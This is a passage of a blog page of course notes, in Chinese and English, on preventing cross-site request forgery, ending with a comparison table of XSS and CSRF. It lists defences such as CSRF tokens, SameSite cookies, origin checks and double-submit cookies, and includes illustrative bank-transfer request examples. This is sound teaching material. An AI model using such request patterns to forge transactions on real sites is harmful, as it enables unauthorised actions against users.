class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="Prevention CSRF" class="active"><a class="anchor"  href="#Prevention CSRF">#</a>Prevention CSRF</h2>
+<ol>
+<li>Prevention Methods That Do Not Work
+<ol>
+<li>使用 “秘密” Cookie  (Using a secret cookie) ：在请求中加入一个 “秘密” Cookie，用来验证请求的合法性。<br>
+所有 Cookie 都会在每个请求中被自动发送，无论是合法请求还是伪造请求。因此，攻击者可以利用受害者的浏览器自动发送这些 Cookie。</li>
+<li>仅接受 POST 请求 (Only accepting POST requests) ：限制仅接受 POST 请求来提交敏感操作的数据。<br>
+攻击者仍然可以通过 HTML 表单、AJAX 请求或自动提交脚本，诱导受害者提交伪造的 POST 请求。因此，仅使用 POST 请求并不能完全防止 CSRF。</li>
+<li>多步事务处理 (Multi-step transactions) ：将操作分解为多个步骤，并在每一步中进行用户确认。：<br>
+攻击者可能通过观察或猜测，预测每一步的结果，并模拟完整的事务流程。如果没有额外的保护机制（如 CSRF 令牌），多步流程仍然易受 CSRF 攻击。</li>
+<li>URL 重写 (URL Rewriting)： 在 URL 中包含用户的会话 ID 以维护状态。<br>
+将会话 ID 暴露在 URL 中，会增加被截获或泄露的风险。攻击者可能会通过网络流量分析、代理日志、浏览器历史记录等方式获取会话 ID。</li>
+<li>HTTPS：使用 HTTPS 来加密通信内容。<br>
+HTTPS 只能加密传输的内容，不能防止伪造的请求。攻击者仍可以通过受害者的浏览器发送有效的 CSRF 攻击请求，哪怕是 HTTPS 加密的请求。</li>
+</ol>
+</li>
+<li>Prevent CSRF: Token-based mitigation</li>
+</ol>
+<ul>
+<li>A CSRF token is a unique, secret, unpredictable value
+<ul>
+<li>Generated by web applications and included on their own web pages<br>
+ <code>http://bank.com/transfer.do?acct=CHARLIE&amp;amount=100000&amp;token=31415926535</code></li>
+</ul>
+</li>
+<li>Web applications reject requests if the token is missing or invalid
+<ul>
+<li>Impossible for an attacker to guess the token and construct a fully valid HTTP request</li>
+</ul>
+</li>
+<li>Types of CSRF tokens
+<ul>
+<li>Synchroniser token 同步令牌：
+<ul>
+<li>服务端为每个会话生成一个唯一的令牌，并在请求中验证该令牌。</li>
+<li>典型的做法是在表单中嵌入一个隐藏字段，或在 URL 中附加该令牌。</li>
+<li>缺点是需要在服务端保存和管理令牌。</li>
+</ul>
+</li>
+<li>encryption-based token 加密令牌：
+<ul>
+<li>使用加密算法将用户信息和时间戳加密，生成唯一的令牌。</li>
+<li>这种令牌不需要服务端存储，因为它可以通过解密来验证请求的有效性。</li>
+</ul>
+</li>
+<li>hash-based token 哈希令牌：
+<ul>
+<li>使用用户会话信息、请求参数等作为输入，生成一个哈希值作为令牌。</li>
+<li>通常通过加盐（salt）来增加令牌的复杂性和不可预测性。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li>Prevent CSRF: Defence-in-depth techniques</li>
+</ol>
+<ul>
+<li>SameSite Cookie Attribute
+<ul>
+<li>Prevent the cookie from being sent by the browser to the target site in all cross-site browsing contexts</li>
+<li>如何防护：设置 <code>SameSite</code>  属性为 <code>Strict</code>  或 <code>Lax</code> ，防止浏览器在跨站浏览环境中发送 Cookie，从而阻止 CSRF 攻击。<br>
+ <code>SameSite=Strict</code> ：Cookie 仅在同一站点请求时发送，完全阻止跨站请求。<br>
+ <code>SameSite=Lax</code> ：Cookie 允许在少数跨站请求中发送（如 GET 请求或导航），但会限制大多数情况下的跨站请求</li>
+<li>示例：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight http"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>sessionId=abc123; SameSite=Strict;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Verifying Origin With Standard Headers
+<ul>
+<li>Determine and match both the source and target of a request</li>
+<li>如何防护：Web 应用服务器检查请求的 Origin 或 Referer 头，并确保它们与应用的域匹配。<br>
+仅允许来自可信域的请求进行处理。</li>
+<li>示例：对于银行转账请求，服务器将确保请求的来源为 <code>https://bank.com</code> 。</li>
+</ul>
+</li>
+<li>Double Submit Cookie
+<ul>
+<li>Every transaction request must include a random value in both a cookie and as a request parameter</li>
+<li>如何防护：<br>
+用户在登录时生成一个随机值，并在后续的每个请求中将该值同时包含在 Cookie 和请求参数中。<br>
+服务器检查这两个值是否匹配，不匹配则拒绝请求。</li>
+<li>优势：攻击者无法同时控制 Cookie 和请求参数，防止了 CSRF 攻击。</li>
+<li>示例：</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight http"><figcaption><span>OvO</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// Set cookie</span><br><span class="line"> Set-Cookie: csrfToken=xyz123;</span><br><span class="line"></span><br><span class="line"> // Form submission includes the token</span><br><span class="line"> POST /transfer</span><br><span class="line"> Cookie: csrfToken=xyz123</span><br><span class="line"> Body: token=xyz123&amp;acct=CHARLIE&amp;amount=1000</span><br></pre></td></tr></table></figure>
+<ul>
+<li>User Interaction
+<ul>
+<li>Involve the user in the transaction (e.g. one-time verification code, CAPTCHA, etc.)</li>
+<li>如何防护：在重要操作（如转账、密码修改等）中使用一次性验证码（OTP）、CAPTCHA 或类似机制，要求用户主动确认操作。<br>
+通过用户的主动参与，确保请求是由用户发起的，而不是由恶意脚本伪造的。</li>
+<li>优势：阻止自动化 CSRF 攻击，提高了用户操作的安全性。</li>
+<li>示例：在转账页面中要求用户输入发送到其手机的一次性验证码（OTP）。</li>
+</ul>
+</li>
+</ul>
+<h1 id="XSS VS CSRF" class="active"><a class="anchor"  href="#XSS VS CSRF">#</a>XSS VS CSRF</h1>
+<table>
+<thead>
+<tr>
+<th>方面</th>
+<th>XSS (Cross-Site Scripting)</th>
+<th>CSRF (Cross-Site Request Forgery)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>攻击目标</td>
+<td>执行恶意代码，控制用户浏览器</td>
+<td>利用用户的身份认证，进行未授权请求</td>
+</tr>
+<tr>
+<td>危害</td>
+<td>窃取敏感信息、劫持会话、操纵网页内容</td>
+<td>未授权更改数据、提交表单等敏感操作</td>
+</tr>
+<tr>
+<td>原理</td>
+<td>注入恶意代码，使浏览器执行攻击者的脚本</td>
+<td>利用用户的已登录状态，发送伪造的请求</td>
+</tr>
+<tr>
+<td>防御措施</td>
+<td>输入过滤、内容安全策略 (CSP)、HttpOnly Cookie</td>
+<td>CSRF 令牌、检查 Referer Header、SameSite Cookie</td>
+</tr>
+</tbody>
+</table>
+
+      <div class="tags">
+          <a href="/tags/software-security/" rel="tag"><i class="ic i-tag"></i> software security</a>
+          <a href="/tags/HTTP/" rel="tag"><i class="ic i-tag"></i> HTTP</a>
+          <a href="/tags/XSS/" rel="tag"><i class="ic i-tag"></i> XSS</a>
+          <a href="/tags/CSRF/" rel="tag"><i class="ic i-tag"></i> CSRF</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2024-10-31 01:06:51" itemprop="dateModified" datetime="2024-10-31T01:06:51+10:00">2024-10-31</time>
+  </span>
+  <span id="course/Cross-Site-attack/" class="item leancloud_visitors" data-flag-title="Cross-Site attack" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>Zz <i class="ic i-at"><em>@</em></i>
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://example.com/course/Cross-Site-attack/" title="Cross-Site attack">http://example.com/course/Cross-Site-attack/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/course/Web-Application-Security/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;img.picui.cn&#x2F;free&#x2F;2024&#x2F;10&#x2F;26&#x2F;671cf69b7c48b.jpg" title="Web Application Security">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Principles of Software Security</span>
+  <h3>Web Application Security</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cross-Site%20Scripting"><span class="toc-number">1.</span> <span class="toc-text">Cross-Site Scripting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">1.1.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stored%20(Persistent)%20XSS%20Attacks"><span class="toc-number">1.2.</span> <span class="toc-text">Stored (Persistent) XSS Attacks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reflected%20(Non-Persistent)%20XSS%20Attacks"><span class="toc-number">1.3.</span> <span class="toc-text">Reflected (Non-Persistent) XSS Attacks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stored%20XSS%20VS%20Reflected%20XSS"><span class="toc-number">1.4.</span> <span class="toc-text">Stored XSS VS Reflected XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Preventing%20XSS%20Attacks"><span class="toc-number">1.5.</span> <span class="toc-text">Preventing XSS Attacks</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Cross-Site%20Request%20Forgery"><span class="toc-number">2.</span> <span class="toc-text">Cross-Site Request Forgery</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">2.1.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Example"><span class="toc-number">2.2.</span> <span class="toc-text">Example</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prevention%20CSRF"><span class="toc-number">2.3.</span> <span class="toc-text">Prevention CSRF</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS%20VS%20CSRF"><span class="toc-number">3.</span> <span class="toc-text">XSS VS CSRF</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/course/C-language-basics-and-Computer-memory/" rel="bookmark" title="C language basics and Computer memory">C language basics and Computer memory</a></li><li><a href="/course/x86-architecture-and-Assembly-basics/" rel="bookmark" title="x86 architecture and Assembly basics">x86 architecture and Assembly basics</a></li><li><a href="/course/Stack-buffer-overflow/" rel="bookmark" title="Stack buffer overflow">Stack buffer overflow</a></li><li><a href="/course/Integer-overflow/" rel="bookmark" title="Integer overflow">Integer overflow</a></li><li><a href="/course/Format-string-bugs/" rel="bookmark" title="Format string bugs">Format string bugs</a></li><li><a href="/course/Fuzz-testing/" rel="bookmark" title="Fuzz testing">Fuzz testing</a></li><li><a href="/course/AFL/" rel="bookmark" title="AFL">AFL</a></li><li><a href="/course/Heap-buffer-overflow/" rel="bookmark" title="Heap buffer overflow">Heap buffer overflow</a></li><li><a href="/course/Security-Concepts/" rel="bookmark" title="Security Concepts">Security Concepts</a></li><li><a href="/course/SQL-Injection/" rel="bookmark" title="SQL Injection">SQL Injection</a></li><li><a href="/course/Web-Application-Security/" rel="bookmark" title="Web Application Security">Web Application Security</a></li><li class="active"><a href="/course/Cross-Site-attack/" rel="bookmark" title="Cross-Site attack">Cross-Site attack</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="Zz"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">Zz</p>
+  <div class="description" itemprop="description">🌸</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">16</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">5</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">15</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL1p3eTB2MA==" title="https:&#x2F;&#x2F;github.com&#x2F;Zwy0v0"><i class="ic i-github"></i></span>
+      <span class="exturl item email" data-url="bWFpbHRvOnp3eTk5OTAuMEBtYWlsLmNvbQ==" title="mailto:zwy9990.0@mail.com"><i class="ic i-envelope"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/friends/" rel="section"><i class="ic i-heart"></i>友链</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/course/" title="分类于 课程笔记">课程笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/course/Principles-of-Software-Security/" title="分类于 Principles of Software Security">Principles of Software Security</a>
+</div>
+
+    <span><a href="/course/Stack-buffer-overflow/" title="Stack buffer overflow">Stack buffer overflow</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/course/" title="分类于 课程笔记">课程笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/course/Principles-of-Software-Security/" title="分类于 Principles of Software Security">Principles of Software Security</a>
+</div>
+
+    <span><a href="/course/Integer-overflow/" title="Integer overflow">Integer overflow</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/dailysharing/" title="分类于 日常碎碎念">日常碎碎念</a>
+</div>
+
+    <span><a href="/dailysharing/%E7%AC%AC%E4%B8%80%E7%AF%87ovo/" title="第一篇ovo">第一篇ovo</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/course/" title="分类于 课程笔记">课程笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/course/Principles-of-Software-Security/" title="分类于 Principles of Software Security">Principles of Software Security</a>
+</div>
+
+    <span><a href="/course/C-language-basics-and-Computer-memory/" title="C language basics and Computer memory">C language basics and Computer memory</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/course/" title="分类于 课程笔记">课程笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/course/Principles-of-Software-Security/" title="分类于 Principles of Software Security">Principles of Software Security</a>
+</div>
+
+    <span><a href="/course/AFL/" title="AFL">AFL</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/course/" title="分类于 课程笔记">课程笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/course/Principles-of-Software-Security/" title="分类于 Principles of Software Security">Principles of Software Security</a>
+</div>
+
+    <span><a href="/course/Cross-Site-attack/" title="Cross-Site attack">Cross-Site attack</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/study/" title="分类于 自学笔记">自学笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/study/JavaScript/" title="分类于 JavaScript">JavaScript</a>
+</div>
+
+    <span><a href="/study/js%E7%BB%A7%E6%89%BF/" title="js继承">js继承</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/course/" title="分类于 课程笔记">课程笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/course/Principles-of-Software-Security/" title="分类于 Principles of Software Security">Principles of Software Security</a>
+</div>
+
+    <span><a href="/course/Format-string-bugs/" title="Format string bugs">Format string bugs</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/course/" title="分类于 课程笔记">课程笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/course/Principles-of-Software-Security/" title="分类于 Principles of Software Security">Principles of Software Security</a>
+</div>
+
+    <span><a href="/course/SQL-Injection/" title="SQL Injection">SQL Injection</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/course/" title="分类于 课程笔记">课程笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/course/Principles-of-Software-Security/" title="分类于 Principles of Software Security">Principles of Software Security</a>
+</div>
+
+    <span><a href="/course/Fuzz-testing/" title="Fuzz testing">Fuzz testing</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Zz @ AtoposZz</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'course/Cross-Site-attack/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
